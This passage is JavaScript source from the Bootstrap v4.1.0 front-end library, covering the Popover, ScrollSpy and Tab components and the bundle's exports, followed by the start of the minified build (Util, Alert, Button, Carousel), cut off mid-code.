      template: '<div class="popover" role="tooltip">' + '<div class="arrow"></div>' + '<h3 class="popover-header"></h3>' + '<div class="popover-body"></div></div>'
    });

    var DefaultType = _objectSpread({}, Tooltip.DefaultType, {
      content: '(string|element|function)'
    });

    var ClassName = {
      FADE: 'fade',
      SHOW: 'show'
    };
    var Selector = {
      TITLE: '.popover-header',
      CONTENT: '.popover-body'
    };
    var Event = {
      HIDE: "hide" + EVENT_KEY,
      HIDDEN: "hidden" + EVENT_KEY,
      SHOW: "show" + EVENT_KEY,
      SHOWN: "shown" + EVENT_KEY,
      INSERTED: "inserted" + EVENT_KEY,
      CLICK: "click" + EVENT_KEY,
      FOCUSIN: "focusin" + EVENT_KEY,
      FOCUSOUT: "focusout" + EVENT_KEY,
      MOUSEENTER: "mouseenter" + EVENT_KEY,
      MOUSELEAVE: "mouseleave" + EVENT_KEY
      /**
       * ------------------------------------------------------------------------
       * Class Definition
       * ------------------------------------------------------------------------
       */

    };

    var Popover =
      /*#__PURE__*/
      function (_Tooltip) {
        _inheritsLoose(Popover, _Tooltip);

        function Popover() {
          return _Tooltip.apply(this, arguments) || this;
        }

        var _proto = Popover.prototype;

        // Overrides
        _proto.isWithContent = function isWithContent() {
          return this.getTitle() || this._getContent();
        };

        _proto.addAttachmentClass = function addAttachmentClass(attachment) {
          $$$1(this.getTipElement()).addClass(CLASS_PREFIX + "-" + attachment);
        };

        _proto.getTipElement = function getTipElement() {
          this.tip = this.tip || $$$1(this.config.template)[0];
          return this.tip;
        };

        _proto.setContent = function setContent() {
          var $tip = $$$1(this.getTipElement()); // We use append for html objects to maintain js events

          this.setElementContent($tip.find(Selector.TITLE), this.getTitle());

          var content = this._getContent();

          if (typeof content === 'function') {
            content = content.call(this.element);
          }

          this.setElementContent($tip.find(Selector.CONTENT), content);
          $tip.removeClass(ClassName.FADE + " " + ClassName.SHOW);
        }; // Private


        _proto._getContent = function _getContent() {
          return this.element.getAttribute('data-content') || this.config.content;
        };

        _proto._cleanTipClass = function _cleanTipClass() {
          var $tip = $$$1(this.getTipElement());
          var tabClass = $tip.attr('class').match(BSCLS_PREFIX_REGEX);

          if (tabClass !== null && tabClass.length > 0) {
            $tip.removeClass(tabClass.join(''));
          }
        }; // Static


        Popover._jQueryInterface = function _jQueryInterface(config) {
          return this.each(function () {
            var data = $$$1(this).data(DATA_KEY);

            var _config = typeof config === 'object' ? config : null;

            if (!data && /destroy|hide/.test(config)) {
              return;
            }

            if (!data) {
              data = new Popover(this, _config);
              $$$1(this).data(DATA_KEY, data);
            }

            if (typeof config === 'string') {
              if (typeof data[config] === 'undefined') {
                throw new TypeError("No method named \"" + config + "\"");
              }

              data[config]();
            }
          });
        };

        _createClass(Popover, null, [{
          key: "VERSION",
          // Getters
          get: function get() {
            return VERSION;
          }
        }, {
          key: "Default",
          get: function get() {
            return Default;
          }
        }, {
          key: "NAME",
          get: function get() {
            return NAME;
          }
        }, {
          key: "DATA_KEY",
          get: function get() {
            return DATA_KEY;
          }
        }, {
          key: "Event",
          get: function get() {
            return Event;
          }
        }, {
          key: "EVENT_KEY",
          get: function get() {
            return EVENT_KEY;
          }
        }, {
          key: "DefaultType",
          get: function get() {
            return DefaultType;
          }
        }]);

        return Popover;
      }(Tooltip);
    /**
     * ------------------------------------------------------------------------
     * jQuery
     * ------------------------------------------------------------------------
     */


    $$$1.fn[NAME] = Popover._jQueryInterface;
    $$$1.fn[NAME].Constructor = Popover;

    $$$1.fn[NAME].noConflict = function () {
      $$$1.fn[NAME] = JQUERY_NO_CONFLICT;
      return Popover._jQueryInterface;
    };

    return Popover;
  }($);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.1.0): scrollspy.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  var ScrollSpy = function ($$$1) {
    /**
     * ------------------------------------------------------------------------
     * Constants
     * ------------------------------------------------------------------------
     */
    var NAME = 'scrollspy';
    var VERSION = '4.1.0';
    var DATA_KEY = 'bs.scrollspy';
    var EVENT_KEY = "." + DATA_KEY;
    var DATA_API_KEY = '.data-api';
    var JQUERY_NO_CONFLICT = $$$1.fn[NAME];
    var Default = {
      offset: 10,
      method: 'auto',
      target: ''
    };
    var DefaultType = {
      offset: 'number',
      method: 'string',
      target: '(string|element)'
    };
    var Event = {
      ACTIVATE: "activate" + EVENT_KEY,
      SCROLL: "scroll" + EVENT_KEY,
      LOAD_DATA_API: "load" + EVENT_KEY + DATA_API_KEY
    };
    var ClassName = {
      DROPDOWN_ITEM: 'dropdown-item',
      DROPDOWN_MENU: 'dropdown-menu',
      ACTIVE: 'active'
    };
    var Selector = {
      DATA_SPY: '[data-spy="scroll"]',
      ACTIVE: '.active',
      NAV_LIST_GROUP: '.nav, .list-group',
      NAV_LINKS: '.nav-link',
      NAV_ITEMS: '.nav-item',
      LIST_ITEMS: '.list-group-item',
      DROPDOWN: '.dropdown',
      DROPDOWN_ITEMS: '.dropdown-item',
      DROPDOWN_TOGGLE: '.dropdown-toggle'
    };
    var OffsetMethod = {
      OFFSET: 'offset',
      POSITION: 'position'
      /**
       * ------------------------------------------------------------------------
       * Class Definition
       * ------------------------------------------------------------------------
       */

    };

    var ScrollSpy =
      /*#__PURE__*/
      function () {
        function ScrollSpy(element, config) {
          var _this = this;

          this._element = element;
          this._scrollElement = element.tagName === 'BODY' ? window : element;
          this._config = this._getConfig(config);
          this._selector = this._config.target + " " + Selector.NAV_LINKS + "," + (this._config.target + " " + Selector.LIST_ITEMS + ",") + (this._config.target + " " + Selector.DROPDOWN_ITEMS);
          this._offsets = [];
          this._targets = [];
          this._activeTarget = null;
          this._scrollHeight = 0;
          $$$1(this._scrollElement).on(Event.SCROLL, function (event) {
            return _this._process(event);
          });
          this.refresh();

          this._process();
        } // Getters


        var _proto = ScrollSpy.prototype;

        // Public
        _proto.refresh = function refresh() {
          var _this2 = this;

          var autoMethod = this._scrollElement === this._scrollElement.window ? OffsetMethod.OFFSET : OffsetMethod.POSITION;
          var offsetMethod = this._config.method === 'auto' ? autoMethod : this._config.method;
          var offsetBase = offsetMethod === OffsetMethod.POSITION ? this._getScrollTop() : 0;
          this._offsets = [];
          this._targets = [];
          this._scrollHeight = this._getScrollHeight();
          var targets = $$$1.makeArray($$$1(this._selector));
          targets.map(function (element) {
            var target;
            var targetSelector = Util.getSelectorFromElement(element);

            if (targetSelector) {
              target = $$$1(targetSelector)[0];
            }

            if (target) {
              var targetBCR = target.getBoundingClientRect();

              if (targetBCR.width || targetBCR.height) {
                // TODO (fat): remove sketch reliance on jQuery position/offset
                return [$$$1(target)[offsetMethod]().top + offsetBase, targetSelector];
              }
            }

            return null;
          }).filter(function (item) {
            return item;
          }).sort(function (a, b) {
            return a[0] - b[0];
          }).forEach(function (item) {
            _this2._offsets.push(item[0]);

            _this2._targets.push(item[1]);
          });
        };

        _proto.dispose = function dispose() {
          $$$1.removeData(this._element, DATA_KEY);
          $$$1(this._scrollElement).off(EVENT_KEY);
          this._element = null;
          this._scrollElement = null;
          this._config = null;
          this._selector = null;
          this._offsets = null;
          this._targets = null;
          this._activeTarget = null;
          this._scrollHeight = null;
        }; // Private


        _proto._getConfig = function _getConfig(config) {
          config = _objectSpread({}, Default, config);

          if (typeof config.target !== 'string') {
            var id = $$$1(config.target).attr('id');

            if (!id) {
              id = Util.getUID(NAME);
              $$$1(config.target).attr('id', id);
            }

            config.target = "#" + id;
          }

          Util.typeCheckConfig(NAME, config, DefaultType);
          return config;
        };

        _proto._getScrollTop = function _getScrollTop() {
          return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop;
        };

        _proto._getScrollHeight = function _getScrollHeight() {
          return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
        };

        _proto._getOffsetHeight = function _getOffsetHeight() {
          return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height;
        };

        _proto._process = function _process() {
          var scrollTop = this._getScrollTop() + this._config.offset;

          var scrollHeight = this._getScrollHeight();

          var maxScroll = this._config.offset + scrollHeight - this._getOffsetHeight();

          if (this._scrollHeight !== scrollHeight) {
            this.refresh();
          }

          if (scrollTop >= maxScroll) {
            var target = this._targets[this._targets.length - 1];

            if (this._activeTarget !== target) {
              this._activate(target);
            }

            return;
          }

          if (this._activeTarget && scrollTop < this._offsets[0] && this._offsets[0] > 0) {
            this._activeTarget = null;

            this._clear();

            return;
          }

          for (var i = this._offsets.length; i--;) {
            var isActiveTarget = this._activeTarget !== this._targets[i] && scrollTop >= this._offsets[i] && (typeof this._offsets[i + 1] === 'undefined' || scrollTop < this._offsets[i + 1]);

            if (isActiveTarget) {
              this._activate(this._targets[i]);
            }
          }
        };

        _proto._activate = function _activate(target) {
          this._activeTarget = target;

          this._clear();

          var queries = this._selector.split(','); // eslint-disable-next-line arrow-body-style


          queries = queries.map(function (selector) {
            return selector + "[data-target=\"" + target + "\"]," + (selector + "[href=\"" + target + "\"]");
          });
          var $link = $$$1(queries.join(','));

          if ($link.hasClass(ClassName.DROPDOWN_ITEM)) {
            $link.closest(Selector.DROPDOWN).find(Selector.DROPDOWN_TOGGLE).addClass(ClassName.ACTIVE);
            $link.addClass(ClassName.ACTIVE);
          } else {
            // Set triggered link as active
            $link.addClass(ClassName.ACTIVE); // Set triggered links parents as active
            // With both <ul> and <nav> markup a parent is the previous sibling of any nav ancestor

            $link.parents(Selector.NAV_LIST_GROUP).prev(Selector.NAV_LINKS + ", " + Selector.LIST_ITEMS).addClass(ClassName.ACTIVE); // Handle special case when .nav-link is inside .nav-item

            $link.parents(Selector.NAV_LIST_GROUP).prev(Selector.NAV_ITEMS).children(Selector.NAV_LINKS).addClass(ClassName.ACTIVE);
          }

          $$$1(this._scrollElement).trigger(Event.ACTIVATE, {
            relatedTarget: target
          });
        };

        _proto._clear = function _clear() {
          $$$1(this._selector).filter(Selector.ACTIVE).removeClass(ClassName.ACTIVE);
        }; // Static


        ScrollSpy._jQueryInterface = function _jQueryInterface(config) {
          return this.each(function () {
            var data = $$$1(this).data(DATA_KEY);

            var _config = typeof config === 'object' && config;

            if (!data) {
              data = new ScrollSpy(this, _config);
              $$$1(this).data(DATA_KEY, data);
            }

            if (typeof config === 'string') {
              if (typeof data[config] === 'undefined') {
                throw new TypeError("No method named \"" + config + "\"");
              }

              data[config]();
            }
          });
        };

        _createClass(ScrollSpy, null, [{
          key: "VERSION",
          get: function get() {
            return VERSION;
          }
        }, {
          key: "Default",
          get: function get() {
            return Default;
          }
        }]);

        return ScrollSpy;
      }();
    /**
     * ------------------------------------------------------------------------
     * Data Api implementation
     * ------------------------------------------------------------------------
     */


    $$$1(window).on(Event.LOAD_DATA_API, function () {
      var scrollSpys = $$$1.makeArray($$$1(Selector.DATA_SPY));

      for (var i = scrollSpys.length; i--;) {
        var $spy = $$$1(scrollSpys[i]);

        ScrollSpy._jQueryInterface.call($spy, $spy.data());
      }
    });
    /**
     * ------------------------------------------------------------------------
     * jQuery
     * ------------------------------------------------------------------------
     */

    $$$1.fn[NAME] = ScrollSpy._jQueryInterface;
    $$$1.fn[NAME].Constructor = ScrollSpy;

    $$$1.fn[NAME].noConflict = function () {
      $$$1.fn[NAME] = JQUERY_NO_CONFLICT;
      return ScrollSpy._jQueryInterface;
    };

    return ScrollSpy;
  }($);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.1.0): tab.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  var Tab = function ($$$1) {
    /**
     * ------------------------------------------------------------------------
     * Constants
     * ------------------------------------------------------------------------
     */
    var NAME = 'tab';
    var VERSION = '4.1.0';
    var DATA_KEY = 'bs.tab';
    var EVENT_KEY = "." + DATA_KEY;
    var DATA_API_KEY = '.data-api';
    var JQUERY_NO_CONFLICT = $$$1.fn[NAME];
    var Event = {
      HIDE: "hide" + EVENT_KEY,
      HIDDEN: "hidden" + EVENT_KEY,
      SHOW: "show" + EVENT_KEY,
      SHOWN: "shown" + EVENT_KEY,
      CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY
    };
    var ClassName = {
      DROPDOWN_MENU: 'dropdown-menu',
      ACTIVE: 'active',
      DISABLED: 'disabled',
      FADE: 'fade',
      SHOW: 'show'
    };
    var Selector = {
      DROPDOWN: '.dropdown',
      NAV_LIST_GROUP: '.nav, .list-group',
      ACTIVE: '.active',
      ACTIVE_UL: '> li > .active',
      DATA_TOGGLE: '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]',
      DROPDOWN_TOGGLE: '.dropdown-toggle',
      DROPDOWN_ACTIVE_CHILD: '> .dropdown-menu .active'
      /**
       * ------------------------------------------------------------------------
       * Class Definition
       * ------------------------------------------------------------------------
       */

    };

    var Tab =
      /*#__PURE__*/
      function () {
        function Tab(element) {
          this._element = element;
        } // Getters


        var _proto = Tab.prototype;

        // Public
        _proto.show = function show() {
          var _this = this;

          if (this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && $$$1(this._element).hasClass(ClassName.ACTIVE) || $$$1(this._element).hasClass(ClassName.DISABLED)) {
            return;
          }

          var target;
          var previous;
          var listElement = $$$1(this._element).closest(Selector.NAV_LIST_GROUP)[0];
          var selector = Util.getSelectorFromElement(this._element);

          if (listElement) {
            var itemSelector = listElement.nodeName === 'UL' ? Selector.ACTIVE_UL : Selector.ACTIVE;
            previous = $$$1.makeArray($$$1(listElement).find(itemSelector));
            previous = previous[previous.length - 1];
          }

          var hideEvent = $$$1.Event(Event.HIDE, {
            relatedTarget: this._element
          });
          var showEvent = $$$1.Event(Event.SHOW, {
            relatedTarget: previous
          });

          if (previous) {
            $$$1(previous).trigger(hideEvent);
          }

          $$$1(this._element).trigger(showEvent);

          if (showEvent.isDefaultPrevented() || hideEvent.isDefaultPrevented()) {
            return;
          }

          if (selector) {
            target = $$$1(selector)[0];
          }

          this._activate(this._element, listElement);

          var complete = function complete() {
            var hiddenEvent = $$$1.Event(Event.HIDDEN, {
              relatedTarget: _this._element
            });
            var shownEvent = $$$1.Event(Event.SHOWN, {
              relatedTarget: previous
            });
            $$$1(previous).trigger(hiddenEvent);
            $$$1(_this._element).trigger(shownEvent);
          };

          if (target) {
            this._activate(target, target.parentNode, complete);
          } else {
            complete();
          }
        };

        _proto.dispose = function dispose() {
          $$$1.removeData(this._element, DATA_KEY);
          this._element = null;
        }; // Private


        _proto._activate = function _activate(element, container, callback) {
          var _this2 = this;

          var activeElements;

          if (container.nodeName === 'UL') {
            activeElements = $$$1(container).find(Selector.ACTIVE_UL);
          } else {
            activeElements = $$$1(container).children(Selector.ACTIVE);
          }

          var active = activeElements[0];
          var isTransitioning = callback && active && $$$1(active).hasClass(ClassName.FADE);

          var complete = function complete() {
            return _this2._transitionComplete(element, active, callback);
          };

          if (active && isTransitioning) {
            var transitionDuration = Util.getTransitionDurationFromElement(active);
            $$$1(active).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
          } else {
            complete();
          }
        };

        _proto._transitionComplete = function _transitionComplete(element, active, callback) {
          if (active) {
            $$$1(active).removeClass(ClassName.SHOW + " " + ClassName.ACTIVE);
            var dropdownChild = $$$1(active.parentNode).find(Selector.DROPDOWN_ACTIVE_CHILD)[0];

            if (dropdownChild) {
              $$$1(dropdownChild).removeClass(ClassName.ACTIVE);
            }

            if (active.getAttribute('role') === 'tab') {
              active.setAttribute('aria-selected', false);
            }
          }

          $$$1(element).addClass(ClassName.ACTIVE);

          if (element.getAttribute('role') === 'tab') {
            element.setAttribute('aria-selected', true);
          }

          Util.reflow(element);
          $$$1(element).addClass(ClassName.SHOW);

          if (element.parentNode && $$$1(element.parentNode).hasClass(ClassName.DROPDOWN_MENU)) {
            var dropdownElement = $$$1(element).closest(Selector.DROPDOWN)[0];

            if (dropdownElement) {
              $$$1(dropdownElement).find(Selector.DROPDOWN_TOGGLE).addClass(ClassName.ACTIVE);
            }

            element.setAttribute('aria-expanded', true);
          }

          if (callback) {
            callback();
          }
        }; // Static


        Tab._jQueryInterface = function _jQueryInterface(config) {
          return this.each(function () {
            var $this = $$$1(this);
            var data = $this.data(DATA_KEY);

            if (!data) {
              data = new Tab(this);
              $this.data(DATA_KEY, data);
            }

            if (typeof config === 'string') {
              if (typeof data[config] === 'undefined') {
                throw new TypeError("No method named \"" + config + "\"");
              }

              data[config]();
            }
          });
        };

        _createClass(Tab, null, [{
          key: "VERSION",
          get: function get() {
            return VERSION;
          }
        }]);

        return Tab;
      }();
    /**
     * ------------------------------------------------------------------------
     * Data Api implementation
     * ------------------------------------------------------------------------
     */


    $$$1(document).on(Event.CLICK_DATA_API, Selector.DATA_TOGGLE, function (event) {
      event.preventDefault();

      Tab._jQueryInterface.call($$$1(this), 'show');
    });
    /**
     * ------------------------------------------------------------------------
     * jQuery
     * ------------------------------------------------------------------------
     */

    $$$1.fn[NAME] = Tab._jQueryInterface;
    $$$1.fn[NAME].Constructor = Tab;

    $$$1.fn[NAME].noConflict = function () {
      $$$1.fn[NAME] = JQUERY_NO_CONFLICT;
      return Tab._jQueryInterface;
    };

    return Tab;
  }($);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.0.0): index.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  (function ($$$1) {
    if (typeof $$$1 === 'undefined') {
      throw new TypeError('Bootstrap\'s JavaScript requires jQuery. jQuery must be included before Bootstrap\'s JavaScript.');
    }

    var version = $$$1.fn.jquery.split(' ')[0].split('.');
    var minMajor = 1;
    var ltMajor = 2;
    var minMinor = 9;
    var minPatch = 1;
    var maxMajor = 4;

    if (version[0] < ltMajor && version[1] < minMinor || version[0] === minMajor && version[1] === minMinor && version[2] < minPatch || version[0] >= maxMajor) {
      throw new Error('Bootstrap\'s JavaScript requires at least jQuery v1.9.1 but less than v4.0.0');
    }
  })($);

  exports.Util = Util;
  exports.Alert = Alert;
  exports.Button = Button;
  exports.Carousel = Carousel;
  exports.Collapse = Collapse;
  exports.Dropdown = Dropdown;
  exports.Modal = Modal;
  exports.Popover = Popover;
  exports.Scrollspy = ScrollSpy;
  exports.Tab = Tab;
  exports.Tooltip = Tooltip;

  Object.defineProperty(exports, '__esModule', { value: true });

})));
//# sourceMappingURL=bootstrap.js.map











/*!
  * Bootstrap v4.1.0 (https://getbootstrap.com/)
  * Copyright 2011-2018 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
  */
!function (t, e) { "object" == typeof exports && "undefined" != typeof module ? e(exports, require("jquery")) : "function" == typeof define && define.amd ? define(["exports", "jquery"], e) : e(t.bootstrap = {}, t.jQuery) }(this, function (t, e) { "use strict"; function i(t, e) { for (var n = 0; n < e.length; n++) { var i = e[n]; i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(t, i.key, i) } } function s(t, e, n) { return e && i(t.prototype, e), n && i(t, n), t } function c(r) { for (var t = 1; t < arguments.length; t++) { var o = null != arguments[t] ? arguments[t] : {}, e = Object.keys(o); "function" == typeof Object.getOwnPropertySymbols && (e = e.concat(Object.getOwnPropertySymbols(o).filter(function (t) { return Object.getOwnPropertyDescriptor(o, t).enumerable }))), e.forEach(function (t) { var e, n, i; e = r, i = o[n = t], n in e ? Object.defineProperty(e, n, { value: i, enumerable: !0, configurable: !0, writable: !0 }) : e[n] = i }) } return r } for (var r, n, o, a, l, f, h, u, d, p, g, m, _, v, E, y, b, T, C, w, I, D, A, S, O, N, k, L, P, x, j, R, M, H, W, F, U, B, K, V, Q, Y, G, q, z, X, J, Z, $, tt, et, nt, it, rt, ot, st, at, lt, ct, ft, ht, ut, dt, pt, gt = function (i) { var e = "transitionend"; function t(t) { var e = this, n = !1; return i(this).one(l.TRANSITION_END, function () { n = !0 }), setTimeout(function () { n || l.triggerTransitionEnd(e) }, t), this } var l = { TRANSITION_END: "bsTransitionEnd", getUID: function (t) { for (; t += ~~(1e6 * Math.random()), document.getElementById(t);); return t }, getSelectorFromElement: function (t) { var e = t.getAttribute("data-target"); e && "#" !== e || (e = t.getAttribute("href") || ""); try { return 0 < i(document).find(e).length ? e : null } catch (t) { return null } }, getTransitionDurationFromElement: function (t) { if (!t) return 0; var e = i(t).css("transition-duration"); return parseFloat(e) ? (e = e.split(",")[0], 1e3 * parseFloat(e)) : 0 }, reflow: function (t) { return t.offsetHeight }, triggerTransitionEnd: function (t) { i(t).trigger(e) }, supportsTransitionEnd: function () { return Boolean(e) }, isElement: function (t) { return (t[0] || t).nodeType }, typeCheckConfig: function (t, e, n) { for (var i in n) if (Object.prototype.hasOwnProperty.call(n, i)) { var r = n[i], o = e[i], s = o && l.isElement(o) ? "element" : (a = o, {}.toString.call(a).match(/\s([a-z]+)/i)[1].toLowerCase()); if (!new RegExp(r).test(s)) throw new Error(t.toUpperCase() + ': Option "' + i + '" provided type "' + s + '" but expected type "' + r + '".') } var a } }; return i.fn.emulateTransitionEnd = t, i.event.special[l.TRANSITION_END] = { bindType: e, delegateType: e, handle: function (t) { if (i(t.target).is(this)) return t.handleObj.handler.apply(this, arguments) } }, l }(e = e && e.hasOwnProperty("default") ? e.default : e), mt = (n = "alert", a = "." + (o = "bs.alert"), l = (r = e).fn[n], f = { CLOSE: "close" + a, CLOSED: "closed" + a, CLICK_DATA_API: "click" + a + ".data-api" }, h = "alert", u = "fade", d = "show", p = function () { function i(t) { this._element = t } var t = i.prototype; return t.close = function (t) { t = t || this._element; var e = this._getRootElement(t); this._triggerCloseEvent(e).isDefaultPrevented() || this._removeElement(e) }, t.dispose = function () { r.removeData(this._element, o), this._element = null }, t._getRootElement = function (t) { var e = gt.getSelectorFromElement(t), n = !1; return e && (n = r(e)[0]), n || (n = r(t).closest("." + h)[0]), n }, t._triggerCloseEvent = function (t) { var e = r.Event(f.CLOSE); return r(t).trigger(e), e }, t._removeElement = function (e) { var n = this; if (r(e).removeClass(d), r(e).hasClass(u)) { var t = gt.getTransitionDurationFromElement(e); r(e).one(gt.TRANSITION_END, function (t) { return n._destroyElement(e, t) }).emulateTransitionEnd(t) } else this._destroyElement(e) }, t._destroyElement = function (t) { r(t).detach().trigger(f.CLOSED).remove() }, i._jQueryInterface = function (n) { return this.each(function () { var t = r(this), e = t.data(o); e || (e = new i(this), t.data(o, e)), "close" === n && e[n](this) }) }, i._handleDismiss = function (e) { return function (t) { t && t.preventDefault(), e.close(this) } }, s(i, null, [{ key: "VERSION", get: function () { return "4.1.0" } }]), i }(), r(document).on(f.CLICK_DATA_API, '[data-dismiss="alert"]', p._handleDismiss(new p)), r.fn[n] = p._jQueryInterface, r.fn[n].Constructor = p, r.fn[n].noConflict = function () { return r.fn[n] = l, p._jQueryInterface }, p), _t = (m = "button", v = "." + (_ = "bs.button"), E = ".data-api", y = (g = e).fn[m], b = "active", T = "btn", w = '[data-toggle^="button"]', I = '[data-toggle="buttons"]', D = "input", A = ".active", S = ".btn", O = { CLICK_DATA_API: "click" + v + E, FOCUS_BLUR_DATA_API: (C = "focus") + v + E + " blur" + v + E }, N = function () { function n(t) { this._element = t } var t = n.prototype; return t.toggle = function () { var t = !0, e = !0, n = g(this._element).closest(I)[0]; if (n) { var i = g(this._element).find(D)[0]; if (i) { if ("radio" === i.type) if (i.checked && g(this._element).hasClass(b)) t = !1; else { var r = g(n).find(A)[0]; r && g(r).removeClass(b) } if (t) { if (i.hasAttribute("disabled") || n.hasAttribute("disabled") || i.classList.contains("disabled") || n.classList.contains("disabled")) return; i.checked = !g(this._element).hasClass(b), g(i).trigger("change") } i.focus(), e = !1 } } e && this._element.setAttribute("aria-pressed", !g(this._element).hasClass(b)), t && g(this._element).toggleClass(b) }, t.dispose = function () { g.removeData(this._element, _), this._element = null }, n._jQueryInterface = function (e) { return this.each(function () { var t = g(this).data(_); t || (t = new n(this), g(this).data(_, t)), "toggle" === e && t[e]() }) }, s(n, null, [{ key: "VERSION", get: function () { return "4.1.0" } }]), n }(), g(document).on(O.CLICK_DATA_API, w, function (t) { t.preventDefault(); var e = t.target; g(e).hasClass(T) || (e = g(e).closest(S)), N._jQueryInterface.call(g(e), "toggle") }).on(O.FOCUS_BLUR_DATA_API, w, function (t) { var e = g(t.target).closest(S)[0]; g(e).toggleClass(C, /^focus(in)?$/.test(t.type)) }), g.fn[m] = N._jQueryInterface, g.fn[m].Constructor = N, g.fn[m].noConflict = function () { return g.fn[m] = y, N._jQueryInterface }, N), vt = (L = "carousel", x = "." + (P = "bs.carousel"), j = ".data-api", R = (k = e).fn[L], M = { interval: 5e3, keyboard: !0, slide: !1, pause: "hover", wrap: !0 }, H = { interval: "(number|boolean)", keyboard: "boolean", slide: "(boolean|string)", pause: "(string|boolean)", wrap: "boolean" }, W = "next", F = "prev", U = "left", B = "right", K = { SLIDE: "slide" + x, SLID: "slid" + x, KEYDOWN: "keydown" + x, MOUSEENTER: "mouseenter" + x, MOUSELEAVE: "mouseleave" + x, TOUCHEND: "touchend" + x, LOAD_DATA_API: "load" + x + j, CLICK_DATA_API: "click" + x + j }, V = "carousel", Q = "active", Y = "slide", G = "carousel-item-right", q = "carousel-item-left", z = "carousel-item-next", X = "carousel-item-prev", J = { ACTIVE: ".active", ACTIVE_ITEM: ".active.carousel-item", ITEM: ".carousel-item", NEXT_PREV: ".carousel-item-next, .carousel-item-prev", INDICATORS: ".carousel-indicators", DATA_SLIDE: "[data-slide], [data-slide-to]", DATA_RIDE: '[data-ride="carousel"]' }, Z = function () { function o(t, e) { this._items = null, this._interval = null, this._activeElement = null, this._isPaused = !1, this._isSliding = !1, this.touchTimeout = null, this._config = this._getConfig(e), this._element = k(t)[0], this._indicatorsElement = k(this._element).find(J.INDICATORS)[0], this._addEventListeners() } var t = o.prototype; return t.next = function () { this._isSliding || this._slide(W) }, t.nextWhenVisible = function () { !document.hidden && k(this._element).is(":visible") && "hidden" !== k(this._element).css("visibility") && this.next() }, t.prev = function () { this._isSliding || this._slide(F) }, t.pause = function (t) { t || (this._isPaused = !0), k(this._element).find(J.NEXT_PREV)[0] && (gt.triggerTransitionEnd(this._element), this.cycle(!0)), clearInterval(this._interval), this._interval = null }, t.cycle = function (t) { t || (this._isPaused = !1), this._interval && (clearInterval(this._interval), this._interval = null), this._config.interval && !this._isPaused && (this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval)) }, t.to = function (t) { var e = this; this._activeElement = k(this._element).find(J.ACTIVE_ITEM)[0]; var n = this._getItemIndex(this._activeElement); if (!(t > this._items.length - 1 || t < 0)) if (this._isSliding) k(this._element).one(K.SLID, function () { return e.to(t) }); else { if (n === t) return this.pause(), void this.cycle(); var i = n < t ? W : F; this._slide(i, this._items[t]) } }, t.dispose = function () { k(this._element).off(x), k.removeData(this._element, P), this._items = null, this._config = null, this._element = null, this._interval = null, this._isPaused = null, this._isSliding = null, this._activeElement = null, this._indicatorsElement = null }, t._getConfig = function (t) { return t = c({}, M, t), gt.typeCheckConfig(L, t, H), t }, t._addEventListeners = function () { var e = this; this._config.keyboard && k(this._element).on(K.KEYDOWN, function (t) { return e._keydown(t) }), "hover" === this._config.pause && (k(this._element).on(K.MOUSEENTER, function (t) { return e.pause(t) }).on(K.MOUSELEAVE, function (t) { return e.cycle(t) }), "ontouchstart" in document.documentElement && k(this._element).on(K.TOUCHEND, function () { e.pause(), e.touchTimeout && clearTimeout(e.touchTimeout), e.touchTimeout = setTimeout(function (t) { return e.cycle(t) }, 500 + e._config.interval) })) }, t._keydown = function (t) { if (!/input|textarea/i.test(t.target.tagName)) switch (t.which) { case 37: t.preventDefault(), this.prev(); break; case 39: t.preventDefault(), this.next() } }, t._getItemIndex = function (t) { return this._items = k.makeArray(k(t).parent().find(J.ITEM)), this._items.indexOf(t) }, t._getItemByDirection = function (t, e) { var n = t === W, i = t === F, r = this._getItemIndex(e), o = this._items.length - 1; if ((i && 0 === r || n && r === o) && !this._config.wrap) return e; var s = (r + (t === F ? -1 : 1)) % this._items.length; return -1 === s ? this._items[this._items.length - 1] : this._items[s] }, t._triggerSlideEvent = function (t, e) { var n = this._getItemIndex(t), i = this._getItemIndex(k(this._element).find(J.ACTIVE_ITEM)[0]), r = k.Event(K.SLIDE, { relatedTarget: t, direction: e, from: i, to: n }); return k(this._element).trigger(r), r }, t._setActiveIndicatorElement = function (t) { if (this._indicatorsElement) { k(this._indicatorsElement).find(J.ACTIVE).removeClass(Q); var e = this._indicatorsElement.children[this._getItemIndex(t)]; e && k(e).addClass(Q) } }, t._slide = function (t, e) { var n, i, r, o = this, s = k(this._element).find(J.ACTIVE_ITEM)[0], a = this._getItemIndex(s), l = e || s && this._getItemByDirection(t, s), c = this._getItemIndex(l), f = Boolean(this._interval); if (t === W ? (n = q, i = z, r = U) : (n = G, i = X, r = B), l && k(l).hasClass(Q)) this._isSliding = !1; else if (!this._triggerSlideEvent(l, r).isDefaultPrevented() && s && l) { this._isSliding = !0, f && this.pause(), this._setActiveIndicatorElement(l); var h = k.Event(K.SLID, { relatedTarget: l, direction: r, from: a, to: c }); if (k(this._element).hasClass(Y)) { k(l).addClass(i), gt.reflow(l), k(s).addClass(n), k(l).addClass(n); var u = gt.getTransitionDurationFromElement(s); k(s).one(gt.TRANSITION_END, function () { k(l).removeClass(n + " " + i).addClass(Q), k(s).removeClass(Q + " " + i + " " + n), o._isSliding = !1, setTimeout(function () { return k(o._element).trigger(h) }, 0) }).emulateTransitionEnd(u) } else k(s).removeClass(Q), k(l).addClass(Q), this._isSliding = !1, k(this._element).trigger(h); f && this.cycle() } }, o._jQueryInterface = 